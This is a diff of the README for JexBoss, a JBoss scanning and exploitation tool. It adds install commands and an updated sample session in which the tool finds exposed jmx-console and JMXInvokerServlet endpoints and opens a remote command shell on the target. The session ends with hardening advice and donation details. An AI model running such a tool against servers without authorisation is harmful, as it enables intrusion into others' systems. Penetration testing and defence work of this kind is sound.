@@ -16,6 +16,13 @@ To install the latest version of JexBoss, please use the following commands:
 	cd jexboss
 	python jexboss.py
 
+	OR:
+
+	Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip
+	unzip master.zip
+	cd jexboss-master
+	python jexboss.py
+
 Features
 ----
 The tool and exploits were developed and tested for versions 3, 4, 5 and 6 of the JBoss Application Server.
@@ -34,9 +41,19 @@ Usage example
 * Check the file "demo.png"
 
 ```
+* Via git:
+
 $ git clone https://github.com/joaomatosf/jexboss.git
 $ cd jexboss
 $ python jexboss.py https://site-teste.com
+
+* Or via download:
+
+$ wget https://github.com/joaomatosf/jexboss/archive/master.zip
+$ unzip master.zip
+$ cd jexboss-master
+$ python jexboss.py https://site-teste.com
+
 
  * --- JexBoss: Jboss verify and EXploitation Tool  --- *
  |                                                      |
@@ -51,7 +68,7 @@ $ python jexboss.py https://site-teste.com
 
  * Checking web-console: 	       [ OK ]
  * Checking jmx-console: 	       [ VULNERABLE ]
- * Checking JMXInvokerServlet: 	       [ VULNERABLE ]
+ * Checking JMXInvokerServlet: 	   [ VULNERABLE ]
 
 
  * Do you want to try to run an automated exploitation via "jmx-console" ?
@@ -70,7 +87,7 @@ $ python jexboss.py https://site-teste.com
 
  * https://site-teste.com:
 
- Linux fwgw 2.6.32-431.29.2.el6.x86_64 #1 SMP Tue Sep 9 21:36:05 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+ Linux seglinux 3.18.4-1.el6.elrepo.x86_64 #1 SMP Wed Jan 28 13:28:52 EST 2015 x86_64 x86_64 x86_64 GNU/Linux
 
  CentOS release 6.5 (Final)
 
@@ -85,21 +102,48 @@ Shell> hostname
 fwgw
 
 [Type commands or "exit" to finish]
-Shell> ls -all /tmp
-total 35436
-drwxrwxrwt.  4 root root     4096 Nov 24 16:36 .
-dr-xr-xr-x. 22 root root     4096 Nov 23 03:26 ..
--rw-r--r--.  1 root root 34630995 Out 15 18:07 snortrules-snapshot-2962.tar.gz
--rw-r--r--.  1 root root       32 Out 16 14:51 snortrules-snapshot-2962.tar.gz.md5
--rw-------.  1 root root        0 Set 20 16:45 yum.log
--rw-------.  1 root root     2743 Set 20 17:18 yum_save_tx-2014-09-20-17-18nQiKVo.yumtx
--rw-------.  1 root root     1014 Out  6 00:33 yum_save_tx-2014-10-06-00-33vig5iT.yumtx
--rw-------.  1 root root      543 Out  6 02:14 yum_save_tx-2014-10-06-02-143CcA5k.yumtx
--rw-------.  1 root root    18568 Out 14 03:04 yum_save_tx-2014-10-14-03-04Q9ywQt.yumtx
--rw-------.  1 root root      315 Out 15 16:00 yum_save_tx-2014-10-15-16-004hKzCF.yumtx
+Shell> ls -all /home
+total 16
+drwxr-xr-x.  4 root  root  4096 Jan 26  2015 .
+dr-xr-xr-x. 23 root  root  4096 Mar 31 04:51 ..
+-rwxrwxrwx.  1 root  root     0 Jan 26  2015 file1
+-rw-r-----.  1 root  root     0 Jan 26  2015 file2
+-rw-rw-r--.  1 root  root     0 Jan 26  2015 file3
+drwx------.  2 joao  joao  4096 Jan 26  2015 joao
+drwx------.  2 maria maria 4096 Jan 26  2015 maria
 
 [Type commands or "exit" to finish]
-Shell>
+Shell>exit
+
+Results: potentially compromised server!
+ * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
+ Recommendations:
+ - Remove web consoles and services that are not used, eg:
+    $ rm web-console.war
+    $ rm http-invoker.sar
+    $ rm jmx-console.war
+    $ rm jmx-invoker-adaptor-server.sar
+    $ rm admin-console.war
+ - Use a reverse proxy (eg. nginx, apache, F5)
+ - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)
+ - Search vestiges of exploitation within the directories "deploy" and "management".
+
+ References:
+   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole
+   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf
+
+ - If possible, discard this server!
+ * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
+
+ * Info: review, suggestions, updates, etc:
+   https://github.com/joaomatosf/jexboss
+
+ * DONATE: Please consider making a donation to help improve this tool,
+           including research to new versions of JBoss and zero days.
+
+ * Paypal:  joaomatosf@gmail.com
+ * Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
+ * URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss
 ```
 
 Questions, problems, suggestions and etc:
@@ -107,10 +151,4 @@ Questions, problems, suggestions and etc:
 
 * joaomatosf@gmail.com
 
-Donate:
-----
-* Please consider making a donation to help improve this tool, including research to new versions of JBoss and zero days.
-
-* Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
-* URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss
 
